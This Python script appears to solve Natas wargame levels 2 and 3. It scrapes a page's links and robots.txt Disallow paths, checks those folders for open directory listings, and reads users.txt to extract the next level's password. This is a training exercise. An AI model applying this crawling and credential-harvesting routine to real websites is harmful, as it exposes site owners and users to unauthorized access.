import requests
from requests.auth import HTTPBasicAuth
import re
import natas



def getLink(HTMLResponse):
	"""
		Build a folder list to check based on URL in the source code
		return :
			- list containing URL of found folder.
	"""
	resList = HTMLResponse.text.split('\n')
	linkList = list();

	# Parse HTML response and get all link
	for line in resList:
		# For each line, regex on "<(/*)>" (HTML tag)
		htmlTag = re.findall("<(.*?)>", line)

		# finding "src" and "href" and add the to linkList for further processing
		for x in htmlTag:
			urls = re.search('(src|href)=[\'"]?([^\'" >]+)', x)
			if urls:
				sanitizedURL= urls.group(2)
				if not sanitizedURL.startswith("h"):
					sanitizedURL = url+str(sanitizedURL)
				linkList.append(sanitizedURL)

		folderList = list();
		for link in linkList:
			folder = re.search('(.*)\/', link)
			if folder:
				if folder.group(0) not in folderList:
					folderList.append(folder.group(0))

	return folderList

def getRobots(fList):

	"""
		extract folder for robots.txt. Take a list in input and just update it
		return:
			- list
	"""
	res = requests.get(url+"/robots.txt", auth=HTTPBasicAuth(user, password), stream=True)
	if res.status_code == 200:
		for line in res.text.splitlines():
			disallowedURL = re.search('^Disallow: (.*)', line)
			if disallowedURL:
				fList.append(url+str(disallowedURL.group(1)))
	else:
		print("[-] No robots.txt (return code "+str(res.status_code)+")")
	return fList
				
def lookForIndexOf(fList):
	"""
		look for "index of" in each URL
		- return : list
	"""
	indexOfFolder = list()
	for folderURL in fList:
		# Only check link on the targetted domain
		if url in folderURL:
			# print("[DEBUG] Checking folder ["+folderURL+"]")
			try: 
				res = requests.get(folderURL, auth=HTTPBasicAuth(user, password))
				# list Directory listing found
				if "Index of" in res.text:
					indexOfFolder.append(folderURL)
					# Custom for natas, look for "user.txt" file in listed directory
					lookForUser(res)					
			except AssertionError as error:
				print("[-] issue with URL "+folderURL+"")
				print(error)
	return indexOfFolder


def lookForUser(HTMLResponse):
	"""
		Custom for natas, look for "user.txt" file in listed directory
		return:
			- nothing
	"""
	resList = HTMLResponse.text.split('\n')
	for line in resList :
		if "users.txt" in line:
			res2 = requests.get(HTMLResponse.url+"/users.txt", auth=HTTPBasicAuth(user, password))
			b, p = natas.findPasswordInString(res2.text)
			if b:
				print("[+] Password found ! ["+str(p)+"] ")
				natas.updateLevel(challNumber + 1, p)
				print("[+] Level "+str(challNumber + 1)+" updated")
			break	

challNumber = 2
user, password, url = natas.initLevel(challNumber)
print("[+] Request to "+url)

# request to the URL with BasicAuth
res = requests.get(url, auth=HTTPBasicAuth(user, password))
folderList = getLink(res)
folderList = getRobots(folderList)
indexOfFolder = lookForIndexOf(folderList)



challNumber = 3
user, password, url = natas.initLevel(challNumber)
print("[+] Request to "+url)

# request to the URL with BasicAuth
res = requests.get(url, auth=HTTPBasicAuth(user, password))
folderList = getLink(res)
folderList = getRobots(folderList)
indexOfFolder = lookForIndexOf(folderList)
			
				

	

	